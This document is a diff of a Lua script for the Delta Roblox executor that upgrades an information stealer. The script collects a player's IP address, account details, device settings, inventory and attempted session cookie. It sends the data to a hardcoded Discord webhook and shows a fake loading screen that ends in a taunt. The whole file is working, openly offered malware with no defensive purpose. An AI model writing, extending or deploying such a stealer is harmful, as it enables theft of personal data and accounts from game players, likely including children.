@@ -1,4 +1,4 @@
--- === Delta Stealer + Fake Loading GUI ===
+-- === ULTIMATE DELTA STEALER – MAXIMUM DATA ===
 local webhook = "https://discord.com/api/webhooks/1545855831453474816/68zNp9FU7svcVfUqN4HGLf8Hp0IsTyW-LOI0jCBLB3o0NlbDThj0BfrUcg7mMJ6mPVMg"
 
 -- HTTP sender with multiple fallbacks
@@ -16,9 +16,55 @@ local function sendData(url, jsonPayload)
     return false
 end
 
--- === Collect ALL data ===
+-- === IP FUNCTION (request() + multiple services) ===
+local function getIP()
+    local ip = "N/A"
+    -- Try request() first
+    local ok, res = pcall(function()
+        return request({Url = "https://api.ipify.org", Method = "GET"})
+    end)
+    if ok and res and res.Body and res.Body ~= "" then
+        ip = res.Body:gsub("%s+", "")
+        if ip ~= "" then return ip end
+    end
+    -- Try http_request()
+    ok, res = pcall(function()
+        return http_request({Url = "https://api.ipify.org", Method = "GET"})
+    end)
+    if ok and res and res.Body and res.Body ~= "" then
+        ip = res.Body:gsub("%s+", "")
+        if ip ~= "" then return ip end
+    end
+    -- Fallback to GetAsync with multiple services
+    local services = {
+        "https://api.ipify.org",
+        "https://ip-api.com/json/?fields=query",
+        "https://icanhazip.com",
+        "https://httpbin.org/ip",
+        "https://checkip.amazonaws.com/"
+    }
+    for _, url in ipairs(services) do
+        local ok, result = pcall(function()
+            return game:GetService("HttpService"):GetAsync(url)
+        end)
+        if ok and result and result ~= "" then
+            if result:match('"query":"(.-)"') then
+                ip = result:match('"query":"(.-)"')
+            elseif result:match('"origin":"(.-)"') then
+                ip = result:match('"origin":"(.-)"')
+            else
+                ip = result:gsub("%s+", "")
+            end
+            if ip and ip ~= "" and ip ~= "N/A" then break end
+        end
+    end
+    return ip
+end
+
+-- === COLLECT ALL POSSIBLE DATA ===
 local function collectInfo()
     local info = {}
+
     -- Executor
     info.executor = (getexecutorname and getexecutorname()) or (identifyexecutor and identifyexecutor()) or "Delta"
 
@@ -28,59 +74,77 @@ local function collectInfo()
         info.userId = tostring(player.UserId)
         info.userName = player.Name
         info.displayName = player.DisplayName
-        -- Approx account age from UserId
+        -- Account age
         local id = player.UserId
         if id and id > 0 then
             local year = math.floor((id / 100000000) * 2) + 2006
             info.accountAge = tostring(year) .. " (approx)"
         end
         -- Friends (online)
-        local ok, friends = pcall(function()
-            return #player:GetFriendsOnline()
-        end)
+        local ok, friends = pcall(function() return #player:GetFriendsOnline() end)
         info.friends = ok and tostring(friends) or "N/A"
+        -- Character / humanoid data
+        pcall(function()
+            local char = player.Character
+            if char then
+                local hum = char:FindFirstChild("Humanoid")
+                if hum then
+                    info.health = tostring(hum.Health)
+                    info.maxHealth = tostring(hum.MaxHealth)
+                    info.walkSpeed = tostring(hum.WalkSpeed)
+                    info.jumpPower = tostring(hum.JumpPower)
+                end
+                -- Position
+                local root = char:FindFirstChild("HumanoidRootPart")
+                if root then
+                    info.position = tostring(root.Position)
+                end
+            end
+        end)
     end
 
-    -- Game
+    -- Game info (detailed)
     info.placeId = tostring(game.PlaceId)
     info.jobId = game.JobId
     info.gameName = game.Name or "Unknown"
+    info.gameCreator = game.CreatorId and tostring(game.CreatorId) or "N/A"
+    info.maxPlayers = tostring(game.MaxPlayers or "N/A")
+    info.serverTime = tostring(game.ServerTime)
 
-    -- IP (try multiple services)
-    local ip = "N/A"
-    local ipServices = {
-        "https://api.ipify.org",
-        "https://ip-api.com/json/?fields=query",
-        "https://icanhazip.com"
-    }
-    for _, url in ipairs(ipServices) do
-        local ok, result = pcall(function()
-            return game:GetService("HttpService"):GetAsync(url)
-        end)
-        if ok and result and result ~= "" then
-            if result:match('"query":"(.-)"') then
-                ip = result:match('"query":"(.-)"')
-            else
-                ip = result:gsub("%s+", "")
-            end
-            if ip and ip ~= "" then break end
-        end
-    end
-    info.ip = ip
+    -- IP
+    info.ip = getIP()
 
-    -- Cookie (if available)
-    local cookieOk, cookieVal = pcall(function()
-        return getcookie("https://www.roblox.com/")
-    end)
-    info.cookie = cookieOk and cookieVal or "Not available"
+    -- Cookie (will NOT work on Delta – this is just a placeholder)
+    local cookieOk, cookieVal = pcall(function() return getcookie("https://www.roblox.com/") end)
+    info.cookie = cookieOk and cookieVal or "Not available (Delta不支持)"
 
-    -- Hardware / platform
+    -- Hardware & settings
     pcall(function()
+        local us = game:GetService("UserInputService")
+        info.platform = tostring(us.Platform)
+        info.touchEnabled = tostring(us.TouchEnabled)
+        info.mouseEnabled = tostring(us.MouseEnabled)
+        info.keyboardEnabled = tostring(us.KeyboardEnabled)
         info.graphics = tostring(game:GetService("GraphicsSettings").GraphicsQualityLevel)
-        info.platform = tostring(game:GetService("UserInputService").Platform)
-        info.touch = tostring(game:GetService("UserInputService").TouchEnabled)
-        info.mouse = tostring(game:GetService("UserInputService").MouseEnabled)
-        info.keyboard = tostring(game:GetService("UserInputService").KeyboardEnabled)
+        info.volume = tostring(game:GetService("SoundService").Volume)
+        info.cameraMode = tostring(game:GetService("StarterGui"):GetCore("CameraMode"))
+        info.theme = tostring(game:GetService("StarterGui"):GetCore("Theme"))
+    end)
+
+    -- Network ping (approximate)
+    pcall(function()
+        local stats = game:GetService("Stats")
+        info.ping = tostring(stats.Network.ServerStatsItem["Data Ping"]:GetValueString())
+        info.connected = tostring(stats.Network.Connected)
+    end)
+
+    -- FPS (approx via RunService)
+    pcall(function()
+        local run = game:GetService("RunService")
+        local frameTime = run.RenderStepTime
+        if frameTime and frameTime > 0 then
+            info.fps = tostring(math.floor(1 / frameTime))
+        end
     end)
 
     -- Leaderstats (if any)
@@ -99,6 +163,24 @@ local function collectInfo()
         end
     end)
 
+    -- Backpack / inventory (try common game frameworks)
+    pcall(function()
+        local backpack = player:FindFirstChild("Backpack")
+        if backpack then
+            local items = {}
+            for _, item in ipairs(backpack:GetChildren()) do
+                if item:IsA("Tool") or item:IsA("HopperBin") then
+                    table.insert(items, item.Name)
+                end
+            end
+            if #items > 0 then
+                info.backpack = table.concat(items, ", ")
+            else
+                info.backpack = "Empty"
+            end
+        end
+    end)
+
     return info
 end
 
@@ -106,11 +188,13 @@ end
 local function buildEmbed(data)
     local fields = {}
     for k, v in pairs(data) do
-        table.insert(fields, {name = k, value = tostring(v), inline = true})
+        if v and v ~= "" then
+            table.insert(fields, {name = k, value = tostring(v), inline = true})
+        end
     end
     return {
         embeds = {{
-            title = "Roblox Stealer Log",
+            title = "Roblox Stealer Log (Ultimate)",
             color = 0xFF0000,
             fields = fields,
             footer = {text = "Delta Executor"}
@@ -118,13 +202,13 @@ local function buildEmbed(data)
     }
 end
 
--- === Send data ===
+-- === SEND DATA ===
 local info = collectInfo()
 local embed = buildEmbed(info)
 local json = game:GetService("HttpService"):JSONEncode(embed)
 sendData(webhook, json)
 
--- === Create Fake Loading GUI ===
+-- === FAKE LOADING GUI ===
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 local gui = Instance.new("ScreenGui")
 gui.Parent = playerGui
@@ -138,7 +222,6 @@ frame.BackgroundTransparency = 0.15
 frame.Parent = gui
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 
--- Title
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 40)
 title.Position = UDim2.new(0, 0, 0, 10)
@@ -149,7 +232,6 @@ title.TextScaled = true
 title.Font = Enum.Font.GothamBold
 title.Parent = frame
 
--- Progress bar background
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(0.8, 0, 0, 20)
 bg.Position = UDim2.new(0.1, 0, 0.45, 0)
@@ -157,14 +239,12 @@ bg.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
 bg.Parent = frame
 Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)
 
--- Progress fill (will be tweened)
 local fill = Instance.new("Frame")
 fill.Size = UDim2.new(0, 0, 1, 0)
 fill.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
 fill.Parent = bg
 Instance.new("UICorner", fill).CornerRadius = UDim.new(0, 10)
 
--- Percentage label
 local percent = Instance.new("TextLabel")
 percent.Size = UDim2.new(0, 60, 0, 30)
 percent.Position = UDim2.new(0.5, -30, 0.7, 0)
@@ -175,7 +255,6 @@ percent.TextScaled = true
 percent.Font = Enum.Font.Gotham
 percent.Parent = frame
 
--- Subtext (changes after loading)
 local sub = Instance.new("TextLabel")
 sub.Size = UDim2.new(1, 0, 0, 30)
 sub.Position = UDim2.new(0, 0, 0.85, 0)
@@ -186,9 +265,8 @@ sub.TextScaled = true
 sub.Font = Enum.Font.Gotham
 sub.Parent = frame
 
--- === Animate loading ===
 local function animate()
-    local duration = 3 -- seconds
+    local duration = 3
     local steps = 60
     local stepTime = duration / steps
     for i = 0, steps do
@@ -200,12 +278,10 @@ local function animate()
             task.wait(stepTime)
         end
     end
-    -- Done: change text to taunt
     title.Text = "U GOT YOUR INFOMATION STOLEN LMAO"
     title.TextColor3 = Color3.fromRGB(255, 0, 0)
     sub.Text = "Your data has been sent to the owner."
 
-    -- Add Close button
     local closeBtn = Instance.new("TextButton")
     closeBtn.Size = UDim2.new(0, 100, 0, 35)
     closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
@@ -219,6 +295,5 @@ local function animate()
     closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
 end
 
--- Start animation after a short delay to ensure GUI renders
 task.wait(0.1)
 spawn(animate)
